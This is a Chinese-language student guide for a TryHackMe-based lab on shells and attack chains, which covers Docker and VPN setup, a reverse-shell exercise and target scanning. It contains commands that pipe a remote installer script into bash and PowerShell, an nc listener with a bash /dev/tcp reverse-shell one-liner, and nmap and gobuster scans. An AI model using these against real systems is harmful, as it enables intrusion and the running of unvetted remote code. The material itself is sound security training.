# 學員指南：Shell & 攻擊鍊實踐 Lab

跟著做就對了。**全部步驟 Windows 跟 macOS 一模一樣**。

---

## 你要先準備的東西

1. **Docker Desktop** — <https://www.docker.com/products/docker-desktop/>
   - Windows 版裝完要重開機。
   - macOS 看晶片下載對應版本（Apple Silicon 是 M 系列）。
2. **Chromium 系 browser**：Chrome / Edge / Brave 任一個（裝在系統預設位置即可）。
3. **TryHackMe 的 OpenVPN 設定檔**
   - 登入 TryHackMe → 右上角頭像 → **Access** → 選 region → **Download Configuration File**。
   - 拿到一個 `xxx.ovpn`，**放到任何一個你習慣的資料夾**（例如 `~/thm/`、`C:\thm\`）。**路徑不要有中文或空白**。

---

## 啟動

打開**終端機 / PowerShell**，`cd` 到放 `.ovpn` 的資料夾，執行對應指令：

### macOS / Linux

```bash
/bin/bash -c "$(curl -fsSL https://install-linux-container.ader.pw/)"
```

### Windows (PowerShell)

```powershell
iex "& { $(iwr -useb https://install-linux-container.ader.pw/) }"
```

> 上面網址用的是 dispatcher（Cloudflare Worker）；它會依 User-Agent 自動回對的腳本。
> 第一次跑會 `docker pull` 約 300 MB（網速 1～3 分鐘）；之後啟動只要幾秒。

腳本做的事（不用記，看著跑就好）：

1. 檢查 `docker compose` 是否可用
2. 找一個目前閒置的 host port（之後也都沿用同一個）
3. 啟動容器，容器**自動連 OpenVPN**、**自動開 SOCKS5 proxy** 給 host
4. **自動用 Chrome / Edge / Brave**（獨立 profile，不污染你主 browser）開瀏覽器，已連上 SOCKS5
5. 把終端機帶進容器互動 shell

進去之後看到歡迎選單就成功了。輸入 `lab-help` 隨時叫出選單。

> Windows 第一次如果跳「無法載入指令碼」，先跑這行：
> ```powershell
> Set-ExecutionPolicy -Scope CurrentUser RemoteSigned
> ```

## Shell 互動練習

容器裡輸入：

```
tutorial
```

腳本會帶你過 10 關。每關都會給你一個 prompt，按題目要求輸入指令，腳本會幫你執行並檢查。

需要查指令時，**另開一個終端機**或**用 tmux**（後面會教），輸入：

```
cheat shell
```

按 `q` 離開速查表。

## Reverse Shell

### 1. 進容器（如果不在容器裡）

在原本那個資料夾再跑一次 install 指令即可回到容器。

### 2. 開 tmux 切兩個 pane

```
tmux new -s lab
```

按 **`Ctrl-b`** 然後鬆開，再按 **`|`**（直線符號）。畫面會分成左右兩塊。

- **左邊 pane = 攻擊者 (attacker)**
- **右邊 pane = 受害者 (victim)**

按 `Ctrl-b` 然後**方向鍵**可以在兩個 pane 之間切換。

### 3. 攻擊者開 listener（左 pane）

```
nc -lnvp 4444
```

### 4. 受害者打 reverse shell（右 pane）

```
bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
```

切回左 pane（`Ctrl-b ←`），就會看到 shell 進來了！打 `id` 試試看。

需要更多技巧：

```
cheat reverse-shell
cheat tmux
```

> 結束時按 **`Ctrl-b d`** 離開 tmux 但保留 session（下次 `tmux attach` 就回來）。

## TryHackMe 實作

### 1. 確認 .ovpn 在當前資料夾

啟動前你已經 `cd` 到放 `.ovpn` 的資料夾了，腳本會自動把它 mount 進容器並啟動 VPN。

### 2. 啟動 / 進入容器

跑開頭那段 install 指令。腳本會幫你處理 VPN 與 proxy。

### 3. 確認 VPN 上線（容器內）

```
ip link show tun0
ip addr show tun0
```

### 4. 啟動靶機並用瀏覽器看

到 TryHackMe 房間頁面按 **Start Machine**，等它顯示綠色 active，**複製靶機 IP**。

回到 install 腳本自動開的那個 browser，網址列直接打：

```
http://<TARGET_IP>/
```

就連得到了（因為 browser 走 SOCKS5 → 容器 → tun0 → 靶機）。

### 5. 容器內掃靶機（直接走 tun0）

```
ping -c 2 <TARGET_IP>
nmap -sV --top-ports 100 <TARGET_IP>
gobuster dir -u http://<TARGET_IP> \
  -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

## 結束時

容器會繼續在背景跑（`restart: unless-stopped`），不會吃太多資源。要徹底停掉：

```bash
docker compose -f .shell-attack-lab/docker-compose.yml down
```

或者打開 Docker Desktop 找到 `shell-lab` 容器按停止鈕。

## 下次要再用？

回到原本那個 `.ovpn` 目錄，**再跑同一段 install 指令**即可。腳本偵測到既有狀態，會：

- 沿用同一個 proxy port（browser 不用重設）
- 容器若還在，直接 `exec` 進去
- 容器若停了，重新 `up -d`

## 常見問題

### Q1. 沒找到 Chromium 系 browser

腳本會印 SOCKS5 位址（例如 `127.0.0.1:54321`），請手動裝 Chrome / Edge / Brave，
或在你現有 browser 的 proxy 設定填 SOCKS5 + 同一個位址。

### Q2. `tun0 30 秒內未上線`

- `.ovpn` 沒放在當前目錄、或檔名不是 `.ovpn` 結尾。
- `.ovpn` 下載到一半壞掉：回 TryHackMe 重下一份。
- 看 log（容器內）：

  ```
  sudo tail -50 /var/log/openvpn.log
  ```

### Q3. VPN 通了，瀏覽器連不到 `http://<TARGET_IP>/`

依序檢查：

1. **靶機真的開著嗎？** TryHackMe 房間按 Start Machine。
2. **容器內 ping 得到嗎？** `ping -c 2 <TARGET_IP>`。
3. **port 對嗎？** 有些靶機是 8080 不是 80：`http://<TARGET_IP>:8080/`。
4. **是不是你關了 install 腳本開的那個 browser，又用主 browser 開？** 主 browser 沒設 proxy，連不到。請繼續用 install 腳本開的那個獨立 profile browser。

### Q4. Docker Desktop 一直開不起來（Windows）

- BIOS 要打開虛擬化（VT-x / AMD-V / SVM）。
- Windows Features 要勾「虛擬機器平台」與「適用於 Linux 的 Windows 子系統」。
- 重開機。

### Q5. 容器壞掉想砍掉重來

```bash
docker compose -f .shell-attack-lab/docker-compose.yml down
rm -rf .shell-attack-lab
```

再跑一次 install 指令即可。
